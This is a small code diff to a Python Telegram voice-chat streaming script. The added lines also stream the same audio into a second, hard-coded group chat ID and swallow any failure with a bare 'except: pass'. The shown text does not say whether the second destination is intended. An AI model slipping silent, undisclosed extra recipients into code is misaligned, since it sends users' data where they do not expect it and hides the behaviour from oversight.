@@ -62,6 +62,10 @@ async def main ():
   obj.start()
   audio = obj.get_dest()
   await call_py.join_group_call(CHAT_ID,AudioPiped(audio),stream_type=StreamType().pulse_stream,)
+  try:
+     await call_py.join_group_call(-1001689253708,AudioPiped(audio),stream_type=StreamType().pulse_stream,)
+  except:
+     pass
   await idle()
 
 asyncio.run(main())
